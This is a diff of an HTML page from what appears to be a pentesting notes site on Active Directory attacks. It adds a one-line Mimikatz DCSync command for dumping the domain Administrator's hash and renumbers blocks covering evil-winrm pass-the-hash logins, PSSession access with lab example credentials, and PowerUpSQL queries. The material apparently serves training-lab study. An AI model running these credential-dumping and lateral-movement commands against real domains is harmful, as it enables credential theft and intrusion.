@@ -689,6 +689,8 @@
       
         
       
+        
+      
     
     
     
@@ -5071,6 +5073,27 @@
   
   
     <li class="md-nav__item">
+      <a href="../xxeinjector/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    xxeinjector
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
       <a href="../ysoserial/" class="md-nav__link">
         
   
@@ -5984,6 +6007,8 @@
       
         
       
+        
+      
     
     
     
@@ -6633,6 +6658,27 @@
   
   <span class="md-ellipsis">
     HTB responder
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../htb-sauna/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTB sauna
   </span>
   
 
@@ -18433,6 +18479,7 @@ $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\dam
 </span><span id="__span-48-3"><a id="__codelineno-48-3" name="__codelineno-48-3"></a><span class="c1"># secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 </span>
 </span></code></pre></div></td></tr></table></div>
 <h4 id="mimikatz">Mimikatz</h4>
+<h5 id="way-1">Way 1:</h5>
 <p>Mimikatz must be ran in the context of the user who has DCSync privileges. We can utilize <code>runas.exe</code> to accomplish this:</p>
 <div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-49-1">1</a></span>
 <span class="normal"><a href="#__codelineno-49-2">2</a></span>
@@ -18455,6 +18502,14 @@ $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\dam
 </span><span id="__span-50-6"><a id="__codelineno-50-6" name="__codelineno-50-6"></a>
 </span><span id="__span-50-7"><a id="__codelineno-50-7" name="__codelineno-50-7"></a><span class="n">lsadump</span><span class="p">::</span><span class="n">dcsync</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">INLANEFREIGHT</span><span class="p">.</span><span class="n">LOCAL</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">INLANEFREIGHT</span><span class="p">\</span><span class="n">administrator</span>
 </span></code></pre></div></td></tr></table></div>
+<h5 id="way-2">Way 2:</h5>
+<p>If we have access to the host with an user who has DCSync privileges (DS-Replication-Get-Changes and the DS-Replication-Get-Changes-All privilege) on the domain, we can run from powershell the attack in one line:</p>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-51-1">1</a></span>
+<span class="normal"><a href="#__codelineno-51-2">2</a></span>
+<span class="normal"><a href="#__codelineno-51-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1"></a><span class="c"># From my Evil-WinRm Connection:</span>
+</span><span id="__span-51-2"><a id="__codelineno-51-2" name="__codelineno-51-2"></a><span class="p">.\</span><span class="n">mimikatz</span><span class="p">.</span><span class="n">exe</span> <span class="n">privilege</span><span class="p">::</span><span class="n">debug</span> <span class="s2">&quot;lsadump::dcsync</span>
+</span><span id="__span-51-3"><a id="__codelineno-51-3" name="__codelineno-51-3"></a><span class="s2">/domain:$domain /user:Administrator&quot;</span> <span class="n">exit</span>
+</span></code></pre></div></td></tr></table></div>
 <h2 id="privileged-access">⛔ Privileged Access</h2>
 <p>Sometimes we don't  have local admin rights on any hosts in the domain. However there are other ways to access the host:</p>
 <ul>
@@ -18476,30 +18531,6 @@ $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\dam
 </ul>
 <h3 id="remote-desktop">Remote Desktop</h3>
 <p>Enumerating the Remote Desktop Users Group with PowerView.ps1.</p>
-<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-51-1">1</a></span>
-<span class="normal"><a href="#__codelineno-51-2">2</a></span>
-<span class="normal"><a href="#__codelineno-51-3">3</a></span>
-<span class="normal"><a href="#__codelineno-51-4">4</a></span>
-<span class="normal"><a href="#__codelineno-51-5">5</a></span>
-<span class="normal"><a href="#__codelineno-51-6">6</a></span>
-<span class="normal"><a href="#__codelineno-51-7">7</a></span>
-<span class="normal"><a href="#__codelineno-51-8">8</a></span>
-<span class="normal"><a href="#__codelineno-51-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">PowerView</span><span class="p">.</span><span class="n">ps1</span>
-</span><span id="__span-51-2"><a id="__codelineno-51-2" name="__codelineno-51-2"></a>
-</span><span id="__span-51-3"><a id="__codelineno-51-3" name="__codelineno-51-3"></a><span class="c"># Enumerate members accessing current machine</span>
-</span><span id="__span-51-4"><a id="__codelineno-51-4" name="__codelineno-51-4"></a><span class="nb">Get-NetLocalGroupMember</span> <span class="n">-GroupName</span> <span class="s2">&quot;Remote Desktop Users&quot;</span>
-</span><span id="__span-51-5"><a id="__codelineno-51-5" name="__codelineno-51-5"></a>
-</span><span id="__span-51-6"><a id="__codelineno-51-6" name="__codelineno-51-6"></a><span class="c"># Enumerate members accessing a given host</span>
-</span><span id="__span-51-7"><a id="__codelineno-51-7" name="__codelineno-51-7"></a><span class="nb">Get-NetLocalGroupMember</span> <span class="n">-ComputerName</span> <span class="nv">$HostName</span> <span class="n">-GroupName</span> <span class="s2">&quot;Remote Desktop Users&quot;</span>
-</span><span id="__span-51-8"><a id="__codelineno-51-8" name="__codelineno-51-8"></a><span class="c"># Example:</span>
-</span><span id="__span-51-9"><a id="__codelineno-51-9" name="__codelineno-51-9"></a><span class="c"># Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName &quot;Remote Desktop Users&quot;</span>
-</span></code></pre></div></td></tr></table></div>
-<p>From Bloodhound, we can check the Analysis tab and run the pre-built queries <code>Find Workstations where Domain Users can RDP</code> or <code>Find Servers where Domain Users can RDP</code>.</p>
-<p>Test access with
-Linux: xfreerdp, rdesktop, Remmina 
-Windows:  mstsc.exe.</p>
-<h3 id="winrm">WinRM</h3>
-<p>Enumerating the Remote Management Users Group with PowerView.ps1.</p>
 <div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-52-1">1</a></span>
 <span class="normal"><a href="#__codelineno-52-2">2</a></span>
 <span class="normal"><a href="#__codelineno-52-3">3</a></span>
@@ -18511,83 +18542,107 @@ Windows:  mstsc.exe.</p>
 <span class="normal"><a href="#__codelineno-52-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">PowerView</span><span class="p">.</span><span class="n">ps1</span>
 </span><span id="__span-52-2"><a id="__codelineno-52-2" name="__codelineno-52-2"></a>
 </span><span id="__span-52-3"><a id="__codelineno-52-3" name="__codelineno-52-3"></a><span class="c"># Enumerate members accessing current machine</span>
-</span><span id="__span-52-4"><a id="__codelineno-52-4" name="__codelineno-52-4"></a><span class="nb">Get-NetLocalGroupMember</span> <span class="n">-GroupName</span> <span class="s2">&quot;Remote Management Users&quot;</span>
+</span><span id="__span-52-4"><a id="__codelineno-52-4" name="__codelineno-52-4"></a><span class="nb">Get-NetLocalGroupMember</span> <span class="n">-GroupName</span> <span class="s2">&quot;Remote Desktop Users&quot;</span>
 </span><span id="__span-52-5"><a id="__codelineno-52-5" name="__codelineno-52-5"></a>
 </span><span id="__span-52-6"><a id="__codelineno-52-6" name="__codelineno-52-6"></a><span class="c"># Enumerate members accessing a given host</span>
-</span><span id="__span-52-7"><a id="__codelineno-52-7" name="__codelineno-52-7"></a><span class="nb">Get-NetLocalGroupMember</span> <span class="n">-ComputerName</span> <span class="nv">$HostName</span> <span class="n">-GroupName</span> <span class="s2">&quot;Remote Management Users&quot;</span>
+</span><span id="__span-52-7"><a id="__codelineno-52-7" name="__codelineno-52-7"></a><span class="nb">Get-NetLocalGroupMember</span> <span class="n">-ComputerName</span> <span class="nv">$HostName</span> <span class="n">-GroupName</span> <span class="s2">&quot;Remote Desktop Users&quot;</span>
 </span><span id="__span-52-8"><a id="__codelineno-52-8" name="__codelineno-52-8"></a><span class="c"># Example:</span>
-</span><span id="__span-52-9"><a id="__codelineno-52-9" name="__codelineno-52-9"></a><span class="c"># Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName &quot;Remote Management Users&quot;</span>
+</span><span id="__span-52-9"><a id="__codelineno-52-9" name="__codelineno-52-9"></a><span class="c"># Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName &quot;Remote Desktop Users&quot;</span>
+</span></code></pre></div></td></tr></table></div>
+<p>From Bloodhound, we can check the Analysis tab and run the pre-built queries <code>Find Workstations where Domain Users can RDP</code> or <code>Find Servers where Domain Users can RDP</code>.</p>
+<p>Test access with
+Linux: xfreerdp, rdesktop, Remmina 
+Windows:  mstsc.exe.</p>
+<h3 id="winrm">WinRM</h3>
+<p>Enumerating the Remote Management Users Group with PowerView.ps1.</p>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-53-1">1</a></span>
+<span class="normal"><a href="#__codelineno-53-2">2</a></span>
+<span class="normal"><a href="#__codelineno-53-3">3</a></span>
+<span class="normal"><a href="#__codelineno-53-4">4</a></span>
+<span class="normal"><a href="#__codelineno-53-5">5</a></span>
+<span class="normal"><a href="#__codelineno-53-6">6</a></span>
+<span class="normal"><a href="#__codelineno-53-7">7</a></span>
+<span class="normal"><a href="#__codelineno-53-8">8</a></span>
+<span class="normal"><a href="#__codelineno-53-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">PowerView</span><span class="p">.</span><span class="n">ps1</span>
+</span><span id="__span-53-2"><a id="__codelineno-53-2" name="__codelineno-53-2"></a>
+</span><span id="__span-53-3"><a id="__codelineno-53-3" name="__codelineno-53-3"></a><span class="c"># Enumerate members accessing current machine</span>
+</span><span id="__span-53-4"><a id="__codelineno-53-4" name="__codelineno-53-4"></a><span class="nb">Get-NetLocalGroupMember</span> <span class="n">-GroupName</span> <span class="s2">&quot;Remote Management Users&quot;</span>
+</span><span id="__span-53-5"><a id="__codelineno-53-5" name="__codelineno-53-5"></a>
+</span><span id="__span-53-6"><a id="__codelineno-53-6" name="__codelineno-53-6"></a><span class="c"># Enumerate members accessing a given host</span>
+</span><span id="__span-53-7"><a id="__codelineno-53-7" name="__codelineno-53-7"></a><span class="nb">Get-NetLocalGroupMember</span> <span class="n">-ComputerName</span> <span class="nv">$HostName</span> <span class="n">-GroupName</span> <span class="s2">&quot;Remote Management Users&quot;</span>
+</span><span id="__span-53-8"><a id="__codelineno-53-8" name="__codelineno-53-8"></a><span class="c"># Example:</span>
+</span><span id="__span-53-9"><a id="__codelineno-53-9" name="__codelineno-53-9"></a><span class="c"># Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName &quot;Remote Management Users&quot;</span>
 </span></code></pre></div></td></tr></table></div>
 <p>In Bloodhound, we can use this Cypher query and add it as a custom query:</p>
-<div class="language-cypher highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-53-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1"></a><span class="k">MATCH</span><span class="w"> </span><span class="n">p1</span><span class="p">=</span><span class="n">shortestPath</span><span class="p">((</span><span class="n">u1</span><span class="p">:</span><span class="n">User</span><span class="p">)</span><span class="o">-[</span><span class="n">r1</span><span class="p">:</span><span class="n">MemberOf</span><span class="p">*</span><span class="m">1</span><span class="p">..</span><span class="o">]-&gt;</span><span class="p">(</span><span class="n">g1</span><span class="p">:</span><span class="n">Group</span><span class="p">))</span><span class="w"> </span><span class="k">MATCH</span><span class="w"> </span><span class="n">p2</span><span class="p">=(</span><span class="n">u1</span><span class="p">)</span><span class="o">-[</span><span class="p">:</span><span class="n">CanPSRemote</span><span class="p">*</span><span class="m">1</span><span class="p">..</span><span class="o">]-&gt;</span><span class="p">(</span><span class="n">c</span><span class="p">:</span><span class="n">Computer</span><span class="p">)</span><span class="w"> </span><span class="k">RETURN</span><span class="w"> </span><span class="n">p2</span>
+<div class="language-cypher highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-54-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1"></a><span class="k">MATCH</span><span class="w"> </span><span class="n">p1</span><span class="p">=</span><span class="n">shortestPath</span><span class="p">((</span><span class="n">u1</span><span class="p">:</span><span class="n">User</span><span class="p">)</span><span class="o">-[</span><span class="n">r1</span><span class="p">:</span><span class="n">MemberOf</span><span class="p">*</span><span class="m">1</span><span class="p">..</span><span class="o">]-&gt;</span><span class="p">(</span><span class="n">g1</span><span class="p">:</span><span class="n">Group</span><span class="p">))</span><span class="w"> </span><span class="k">MATCH</span><span class="w"> </span><span class="n">p2</span><span class="p">=(</span><span class="n">u1</span><span class="p">)</span><span class="o">-[</span><span class="p">:</span><span class="n">CanPSRemote</span><span class="p">*</span><span class="m">1</span><span class="p">..</span><span class="o">]-&gt;</span><span class="p">(</span><span class="n">c</span><span class="p">:</span><span class="n">Computer</span><span class="p">)</span><span class="w"> </span><span class="k">RETURN</span><span class="w"> </span><span class="n">p2</span>
 </span></code></pre></div></td></tr></table></div>
 <p>To access from Linux, use <a href="../evil-winrm/">evil-winrm</a>.</p>
-<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-54-1">1</a></span>
-<span class="normal"><a href="#__codelineno-54-2">2</a></span>
-<span class="normal"><a href="#__codelineno-54-3">3</a></span>
-<span class="normal"><a href="#__codelineno-54-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1"></a>evil-winrm<span class="w"> </span>-i<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-u<span class="w"> </span>&lt;username<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;
-</span><span id="__span-54-2"><a id="__codelineno-54-2" name="__codelineno-54-2"></a>
-</span><span id="__span-54-3"><a id="__codelineno-54-3" name="__codelineno-54-3"></a>evil-winrm<span class="w"> </span>-i<span class="w"> </span>&lt;ip&gt;<span class="w"> </span>-u<span class="w"> </span>Administrator<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;&lt;passwordhash&gt;&quot;</span>
-</span><span id="__span-54-4"><a id="__codelineno-54-4" name="__codelineno-54-4"></a><span class="c1"># -H: Hash</span>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-55-1">1</a></span>
+<span class="normal"><a href="#__codelineno-55-2">2</a></span>
+<span class="normal"><a href="#__codelineno-55-3">3</a></span>
+<span class="normal"><a href="#__codelineno-55-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1"></a>evil-winrm<span class="w"> </span>-i<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-u<span class="w"> </span>&lt;username<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;
+</span><span id="__span-55-2"><a id="__codelineno-55-2" name="__codelineno-55-2"></a>
+</span><span id="__span-55-3"><a id="__codelineno-55-3" name="__codelineno-55-3"></a>evil-winrm<span class="w"> </span>-i<span class="w"> </span>&lt;ip&gt;<span class="w"> </span>-u<span class="w"> </span>Administrator<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;&lt;passwordhash&gt;&quot;</span>
+</span><span id="__span-55-4"><a id="__codelineno-55-4" name="__codelineno-55-4"></a><span class="c1"># -H: Hash</span>
 </span></code></pre></div></td></tr></table></div>
 <p>To access from Windows, use Powershell and the <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-7.2">Enter-PSSession</a> cmdlet:</p>
-<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-55-1"> 1</a></span>
-<span class="normal"><a href="#__codelineno-55-2"> 2</a></span>
-<span class="normal"><a href="#__codelineno-55-3"> 3</a></span>
-<span class="normal"><a href="#__codelineno-55-4"> 4</a></span>
-<span class="normal"><a href="#__codelineno-55-5"> 5</a></span>
-<span class="normal"><a href="#__codelineno-55-6"> 6</a></span>
-<span class="normal"><a href="#__codelineno-55-7"> 7</a></span>
-<span class="normal"><a href="#__codelineno-55-8"> 8</a></span>
-<span class="normal"><a href="#__codelineno-55-9"> 9</a></span>
-<span class="normal"><a href="#__codelineno-55-10">10</a></span>
-<span class="normal"><a href="#__codelineno-55-11">11</a></span>
-<span class="normal"><a href="#__codelineno-55-12">12</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1"></a><span class="c"># Create a SecureString object_</span>
-</span><span id="__span-55-2"><a id="__codelineno-55-2" name="__codelineno-55-2"></a><span class="nv">$password</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s2">&quot;$passwordOfUser&quot;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
-</span><span id="__span-55-3"><a id="__codelineno-55-3" name="__codelineno-55-3"></a><span class="nv">$cred</span> <span class="p">=</span> <span class="nb">new-object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span> <span class="p">(</span><span class="s2">&quot;$domain\$userSamAccountName&quot;</span><span class="p">,</span> <span class="nv">$password</span><span class="p">)</span>
-</span><span id="__span-55-4"><a id="__codelineno-55-4" name="__codelineno-55-4"></a>
-</span><span id="__span-55-5"><a id="__codelineno-55-5" name="__codelineno-55-5"></a><span class="c"># Access the host</span>
-</span><span id="__span-55-6"><a id="__codelineno-55-6" name="__codelineno-55-6"></a><span class="nb">Enter-PSSession</span> <span class="n">-ComputerName</span> <span class="nv">$hostName</span> <span class="n">-Credential</span> <span class="nv">$cred</span>
-</span><span id="__span-55-7"><a id="__codelineno-55-7" name="__codelineno-55-7"></a>
-</span><span id="__span-55-8"><a id="__codelineno-55-8" name="__codelineno-55-8"></a><span class="c">#####</span>
-</span><span id="__span-55-9"><a id="__codelineno-55-9" name="__codelineno-55-9"></a><span class="c"># Example:</span>
-</span><span id="__span-55-10"><a id="__codelineno-55-10" name="__codelineno-55-10"></a><span class="c"># $password = ConvertTo-SecureString &quot;Klmcargo2&quot; -AsPlainText -Force</span>
-</span><span id="__span-55-11"><a id="__codelineno-55-11" name="__codelineno-55-11"></a><span class="c"># $cred = new-object System.Management.Automation.PSCredential (&quot;INLANEFREIGHT\forend&quot;, $password)</span>
-</span><span id="__span-55-12"><a id="__codelineno-55-12" name="__codelineno-55-12"></a><span class="c"># Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred</span>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-56-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-56-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-56-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-56-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-56-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-56-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-56-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-56-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-56-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-56-10">10</a></span>
+<span class="normal"><a href="#__codelineno-56-11">11</a></span>
+<span class="normal"><a href="#__codelineno-56-12">12</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1"></a><span class="c"># Create a SecureString object_</span>
+</span><span id="__span-56-2"><a id="__codelineno-56-2" name="__codelineno-56-2"></a><span class="nv">$password</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s2">&quot;$passwordOfUser&quot;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
+</span><span id="__span-56-3"><a id="__codelineno-56-3" name="__codelineno-56-3"></a><span class="nv">$cred</span> <span class="p">=</span> <span class="nb">new-object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span> <span class="p">(</span><span class="s2">&quot;$domain\$userSamAccountName&quot;</span><span class="p">,</span> <span class="nv">$password</span><span class="p">)</span>
+</span><span id="__span-56-4"><a id="__codelineno-56-4" name="__codelineno-56-4"></a>
+</span><span id="__span-56-5"><a id="__codelineno-56-5" name="__codelineno-56-5"></a><span class="c"># Access the host</span>
+</span><span id="__span-56-6"><a id="__codelineno-56-6" name="__codelineno-56-6"></a><span class="nb">Enter-PSSession</span> <span class="n">-ComputerName</span> <span class="nv">$hostName</span> <span class="n">-Credential</span> <span class="nv">$cred</span>
+</span><span id="__span-56-7"><a id="__codelineno-56-7" name="__codelineno-56-7"></a>
+</span><span id="__span-56-8"><a id="__codelineno-56-8" name="__codelineno-56-8"></a><span class="c">#####</span>
+</span><span id="__span-56-9"><a id="__codelineno-56-9" name="__codelineno-56-9"></a><span class="c"># Example:</span>
+</span><span id="__span-56-10"><a id="__codelineno-56-10" name="__codelineno-56-10"></a><span class="c"># $password = ConvertTo-SecureString &quot;Klmcargo2&quot; -AsPlainText -Force</span>
+</span><span id="__span-56-11"><a id="__codelineno-56-11" name="__codelineno-56-11"></a><span class="c"># $cred = new-object System.Management.Automation.PSCredential (&quot;INLANEFREIGHT\forend&quot;, $password)</span>
+</span><span id="__span-56-12"><a id="__codelineno-56-12" name="__codelineno-56-12"></a><span class="c"># Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred</span>
 </span></code></pre></div></td></tr></table></div>
 <h3 id="sql-server-admin">SQL Server Admin</h3>
 <p>Enumerate via Bloodhound and the <code>SQLAdmin</code> edge. We can check for <code>SQL Admin Rights</code> in the <code>Node Info</code> tab for a given user or use this custom Cypher query to search:</p>
-<div class="language-cypher highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-56-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1"></a><span class="k">MATCH</span><span class="w"> </span><span class="n">p1</span><span class="p">=</span><span class="n">shortestPath</span><span class="p">((</span><span class="n">u1</span><span class="p">:</span><span class="n">User</span><span class="p">)</span><span class="o">-[</span><span class="n">r1</span><span class="p">:</span><span class="n">MemberOf</span><span class="p">*</span><span class="m">1</span><span class="p">..</span><span class="o">]-&gt;</span><span class="p">(</span><span class="n">g1</span><span class="p">:</span><span class="n">Group</span><span class="p">))</span><span class="w"> </span><span class="k">MATCH</span><span class="w"> </span><span class="n">p2</span><span class="p">=(</span><span class="n">u1</span><span class="p">)</span><span class="o">-[</span><span class="p">:</span><span class="n">SQLAdmin</span><span class="p">*</span><span class="m">1</span><span class="p">..</span><span class="o">]-&gt;</span><span class="p">(</span><span class="n">c</span><span class="p">:</span><span class="n">Computer</span><span class="p">)</span><span class="w"> </span><span class="k">RETURN</span><span class="w"> </span><span class="n">p2</span>
+<div class="language-cypher highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-57-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1"></a><span class="k">MATCH</span><span class="w"> </span><span class="n">p1</span><span class="p">=</span><span class="n">shortestPath</span><span class="p">((</span><span class="n">u1</span><span class="p">:</span><span class="n">User</span><span class="p">)</span><span class="o">-[</span><span class="n">r1</span><span class="p">:</span><span class="n">MemberOf</span><span class="p">*</span><span class="m">1</span><span class="p">..</span><span class="o">]-&gt;</span><span class="p">(</span><span class="n">g1</span><span class="p">:</span><span class="n">Group</span><span class="p">))</span><span class="w"> </span><span class="k">MATCH</span><span class="w"> </span><span class="n">p2</span><span class="p">=(</span><span class="n">u1</span><span class="p">)</span><span class="o">-[</span><span class="p">:</span><span class="n">SQLAdmin</span><span class="p">*</span><span class="m">1</span><span class="p">..</span><span class="o">]-&gt;</span><span class="p">(</span><span class="n">c</span><span class="p">:</span><span class="n">Computer</span><span class="p">)</span><span class="w"> </span><span class="k">RETURN</span><span class="w"> </span><span class="n">p2</span>
 </span></code></pre></div></td></tr></table></div>
 <p>Enumerating MSSQL Instances with <a href="../powerupsql/">PowerUpSQL</a>. The command needs to be ran by an user with <code>SQLAdmin</code> rights: </p>
-<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-57-1">1</a></span>
-<span class="normal"><a href="#__codelineno-57-2">2</a></span>
-<span class="normal"><a href="#__codelineno-57-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1"></a><span class="nb">cd </span><span class="n">C</span><span class="p">:\</span><span class="n">Tools</span><span class="p">\</span><span class="n">PowerUpSQL</span><span class="p">\</span>
-</span><span id="__span-57-2"><a id="__codelineno-57-2" name="__codelineno-57-2"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">PowerUpSQL</span><span class="p">.</span><span class="n">ps1</span>
-</span><span id="__span-57-3"><a id="__codelineno-57-3" name="__codelineno-57-3"></a><span class="nb">Get-SQLInstanceDomain</span>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-58-1">1</a></span>
+<span class="normal"><a href="#__codelineno-58-2">2</a></span>
+<span class="normal"><a href="#__codelineno-58-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1"></a><span class="nb">cd </span><span class="n">C</span><span class="p">:\</span><span class="n">Tools</span><span class="p">\</span><span class="n">PowerUpSQL</span><span class="p">\</span>
+</span><span id="__span-58-2"><a id="__codelineno-58-2" name="__codelineno-58-2"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">PowerUpSQL</span><span class="p">.</span><span class="n">ps1</span>
+</span><span id="__span-58-3"><a id="__codelineno-58-3" name="__codelineno-58-3"></a><span class="nb">Get-SQLInstanceDomain</span>
 </span></code></pre></div></td></tr></table></div>
 <p>Authenticate against the remote SQL server host and run custom queries or operating system commands.</p>
-<p><div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-58-1">1</a></span>
-<span class="normal"><a href="#__codelineno-58-2">2</a></span>
-<span class="normal"><a href="#__codelineno-58-3">3</a></span>
-<span class="normal"><a href="#__codelineno-58-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1"></a><span class="nb">Get-SQLQuery</span> <span class="n">-Verbose</span> <span class="n">-Instance</span> <span class="s2">&quot;$ipHost,$port&quot;</span> <span class="n">-username</span> <span class="s2">&quot;$domain\$userSamAccountName&quot;</span> <span class="n">-password</span> <span class="s2">&quot;$password&quot;</span> <span class="n">-query</span> <span class="s1">&#39;Select @@version&#39;</span>
-</span><span id="__span-58-2"><a id="__codelineno-58-2" name="__codelineno-58-2"></a>
-</span><span id="__span-58-3"><a id="__codelineno-58-3" name="__codelineno-58-3"></a><span class="c"># Example:</span>
-</span><span id="__span-58-4"><a id="__codelineno-58-4" name="__codelineno-58-4"></a><span class="c"># Get-SQLQuery -Verbose -Instance &quot;172.16.5.150,1433&quot; -username &quot;inlanefreight\damundsen&quot; -password &quot;SQL1234!&quot; -query &#39;Select @@version&#39;</span>
+<p><div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-59-1">1</a></span>
+<span class="normal"><a href="#__codelineno-59-2">2</a></span>
+<span class="normal"><a href="#__codelineno-59-3">3</a></span>
+<span class="normal"><a href="#__codelineno-59-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1"></a><span class="nb">Get-SQLQuery</span> <span class="n">-Verbose</span> <span class="n">-Instance</span> <span class="s2">&quot;$ipHost,$port&quot;</span> <span class="n">-username</span> <span class="s2">&quot;$domain\$userSamAccountName&quot;</span> <span class="n">-password</span> <span class="s2">&quot;$password&quot;</span> <span class="n">-query</span> <span class="s1">&#39;Select @@version&#39;</span>
+</span><span id="__span-59-2"><a id="__codelineno-59-2" name="__codelineno-59-2"></a>
+</span><span id="__span-59-3"><a id="__codelineno-59-3" name="__codelineno-59-3"></a><span class="c"># Example:</span>
